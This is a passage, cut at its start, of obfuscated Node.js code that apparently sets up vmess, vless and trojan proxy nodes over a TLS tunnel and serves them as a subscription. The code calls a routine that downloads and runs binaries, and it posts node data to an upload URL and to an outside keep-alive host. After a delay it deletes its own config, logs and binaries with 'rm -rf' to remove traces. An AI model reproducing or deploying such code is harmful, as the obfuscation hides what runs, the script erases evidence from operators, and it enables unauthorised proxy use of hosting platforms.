_0x10f3d9=_0x19b1,_0x9cacc7={'v':'2','ps':''+_0x4e9ff9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x10f3d9(_0x3dac69._0x2ddfc5),'net':'ws','type':_0x10f3d9(0xa1),'host':_0x3c5afd,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x3c5afd,'alpn':'','fp':_0x10f3d9(0xdf)},_0x2532b4=_0x10f3d9(_0x3dac69._0x39bd58)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3c5afd+'&fp=firefox&type=ws&host='+_0x3c5afd+_0x10f3d9(_0x3dac69._0x465311)+_0x4e9ff9+_0x10f3d9(_0x3dac69._0x1bbfef)+Buffer[_0x10f3d9(0xf8)](JSON[_0x10f3d9(0xc0)](_0x9cacc7))[_0x10f3d9(0x9b)](_0x10f3d9(0xf2))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3c5afd+'&fp=firefox&type=ws&host='+_0x3c5afd+_0x10f3d9(_0x3dac69._0x2ae627)+_0x4e9ff9+'\x0a\x20\x20\x20\x20';console[_0x10f3d9(0xeb)](Buffer[_0x10f3d9(_0x3dac69._0x1ca001)](_0x2532b4)[_0x10f3d9(0x9b)](_0x10f3d9(0xf2))),fs[_0x10f3d9(_0x3dac69._0x4f5636)](subPath,Buffer['from'](_0x2532b4)[_0x10f3d9(0x9b)](_0x10f3d9(0xf2))),console[_0x10f3d9(0xeb)](FILE_PATH+_0x10f3d9(0x105)),uploadNodes(),app[_0x10f3d9(0xe7)]('/'+SUB_PATH,(_0x1432ad,_0x362fc5)=>{const _0x3aaabf=_0x10f3d9,_0x18c362=Buffer[_0x3aaabf(0xf8)](_0x2532b4)[_0x3aaabf(_0x56573c._0x3f3967)](_0x3aaabf(_0x56573c._0x414727));_0x362fc5[_0x3aaabf(0xb9)]('Content-Type',_0x3aaabf(0x97)),_0x362fc5[_0x3aaabf(_0x56573c._0x2176d0)](_0x18c362);}),_0x1d8ca7(_0x2532b4);},0x7d0);});}}async function uploadNodes(){const _0x2ce4d1={_0x44176f:0x12b,_0x34e850:0xf0,_0x197a88:0xeb,_0x283da1:0xf6,_0x4d1977:0xcf,_0x573130:0xc0,_0x5b234e:0xcb},_0x5a61a4=_0x1da146;if(UPLOAD_URL&&PROJECT_URL){const _0x57594e=PROJECT_URL+'/'+SUB_PATH,_0x564769={'subscription':[_0x57594e]};try{const _0x42b752=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x564769,{'headers':{'Content-Type':_0x5a61a4(_0x2ce4d1._0x44176f)}});return _0x42b752&&_0x42b752[_0x5a61a4(_0x2ce4d1._0x34e850)]===0xc8?(console[_0x5a61a4(_0x2ce4d1._0x197a88)]('Subscription\x20uploaded\x20successfully'),_0x42b752):null;}catch(_0x36fb4d){if(_0x36fb4d['response']){if(_0x36fb4d[_0x5a61a4(_0x2ce4d1._0x283da1)][_0x5a61a4(0xf0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5a61a4(0xbd)](listPath))return;const _0x3792c1=fs[_0x5a61a4(0xa9)](listPath,_0x5a61a4(_0x2ce4d1._0x4d1977)),_0x1a964c=_0x3792c1[_0x5a61a4(0x9e)]('\x0a')[_0x5a61a4(0xc4)](_0x4fdcf3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4fdcf3));if(_0x1a964c['length']===0x0)return;const _0x4e15ce=JSON[_0x5a61a4(_0x2ce4d1._0x573130)]({'nodes':_0x1a964c});try{const _0x39de5e=await axios[_0x5a61a4(_0x2ce4d1._0x5b234e)](UPLOAD_URL+_0x5a61a4(0x113),_0x4e15ce,{'headers':{'Content-Type':_0x5a61a4(_0x2ce4d1._0x44176f)}});return _0x39de5e&&_0x39de5e['status']===0xc8?(console[_0x5a61a4(0xeb)](_0x5a61a4(0x9d)),_0x39de5e):null;}catch(_0x2f1ed3){return null;}}else return;}}function cleanFiles(){const _0x28e4bb={_0x16c65f:0x102,_0x2efbdc:0xd7,_0x45a0cd:0xbb,_0x4aa775:0xe9,_0x17b863:0xc6},_0x2cb514={_0x4afb62:0x91};setTimeout(()=>{const _0x2b1474={_0x58a459:0xc3,_0x927a8a:0xeb},_0x307800=_0x19b1,_0x30c6ae=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x30c6ae[_0x307800(_0x28e4bb._0x16c65f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x30c6ae['push'](phpPath);process[_0x307800(0x13e)]===_0x307800(_0x28e4bb._0x2efbdc)?exec(_0x307800(_0x28e4bb._0x45a0cd)+_0x30c6ae[_0x307800(_0x28e4bb._0x4aa775)]('\x20')+_0x307800(_0x28e4bb._0x17b863),_0x458c97=>{const _0x551f94=_0x307800;console[_0x551f94(_0x2cb514._0x4afb62)](),console[_0x551f94(0xeb)](_0x551f94(0xc3)),console[_0x551f94(0xeb)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x30c6ae['join']('\x20')+'\x20>/dev/null\x202>&1',_0x3d5775=>{const _0x171632=_0x307800;console[_0x171632(0x91)](),console[_0x171632(0xeb)](_0x171632(_0x2b1474._0x58a459)),console[_0x171632(_0x2b1474._0x927a8a)](_0x171632(0x126));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1a0346={_0x166a2d:0x100,_0x5773d0:0x109},_0x3f4bf8=_0x1da146;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2d9e51=await axios[_0x3f4bf8(0xcb)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3f4bf8(0x12b)}});return console[_0x3f4bf8(0xeb)](_0x3f4bf8(_0x1a0346._0x166a2d)),_0x2d9e51;}catch(_0x48fafc){return console[_0x3f4bf8(_0x1a0346._0x5773d0)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x48fafc[_0x3f4bf8(0xa0)]),null;}}async function startserver(){const _0x573470={_0x27aa2b:0xed},_0x587faf=_0x1da146;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x251993){console['error'](_0x587faf(_0x573470._0x27aa2b),_0x251993);}}startserver()[_0x1da146(0xf4)](_0x160fed=>{const _0x323ae4={_0x13a518:0x109,_0x54b38d:0xcc},_0x549ef0=_0x1da146;console[_0x549ef0(_0x323ae4._0x13a518)](_0x549ef0(_0x323ae4._0x54b38d),_0x160fed);}),app[_0x1da146(0xdc)](PORT,()=>console[_0x1da146(0xeb)](_0x1da146(0x131)+PORT+'!'));
